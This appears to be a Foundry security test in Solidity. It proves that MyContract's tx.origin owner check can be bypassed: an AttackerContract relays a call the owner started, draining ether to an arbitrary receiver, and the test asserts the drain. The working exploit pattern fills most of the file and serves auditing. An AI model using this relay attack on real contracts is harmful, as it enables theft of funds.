
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract TestAccessControlMyContract is Test {

    MyContract myContract;
    address owner;

    function setUp() public {
        owner = address(this);
        myContract = new MyContract();
        // Fund the contract so it has balance to transfer
        vm.deal(address(myContract), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint96 amount) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the privileged role)
        vm.assume(caller != owner);

        // Constrain receiver to be a valid address
        vm.assume(receiver != address(0));
        vm.assume(receiver != address(myContract));
        
        // Constrain amount to be within contract balance
        uint256 contractBalance = address(myContract).balance;
        vm.assume(amount > 0 && amount <= contractBalance);

        // --- 2. State Configuration ---
        
        // The contract is already funded in setUp
        // Record receiver's balance before the call
        uint256 receiverBalanceBefore = receiver.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability is that tx.origin == owner check can be bypassed
        // when the owner calls a malicious contract that then calls sendTo.
        // We simulate this by having the owner initiate the transaction,
        // but an intermediate contract (caller) makes the actual call.
        
        // Create an attacker contract that will call sendTo
        AttackerContract attacker = new AttackerContract(address(myContract));
        
        // Fund attacker if needed
        vm.deal(address(attacker), 1 ether);
        
        // The owner (tx.origin) calls the attacker contract
        // The attacker contract then calls myContract.sendTo
        // This bypasses the tx.origin check because tx.origin is still the owner
        vm.prank(owner, owner); // Sets both msg.sender and tx.origin to owner
        attacker.attack(receiver, amount);

        // Assert that the transfer happened - proving the vulnerability
        assertEq(receiver.balance, receiverBalanceBefore + amount, "Funds should have been transferred");
    }
}

// Attacker contract that exploits the tx.origin vulnerability
contract AttackerContract {
    address target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack(address payable receiver, uint amount) external {
        // When owner calls this function:
        // - msg.sender to this contract = owner
        // - tx.origin = owner
        // When this contract calls MyContract.sendTo:
        // - msg.sender to MyContract = this contract (attacker)
        // - tx.origin = owner (unchanged!)
        // This bypasses the tx.origin check!
        MyContract(target).sendTo(receiver, amount);
    }
}
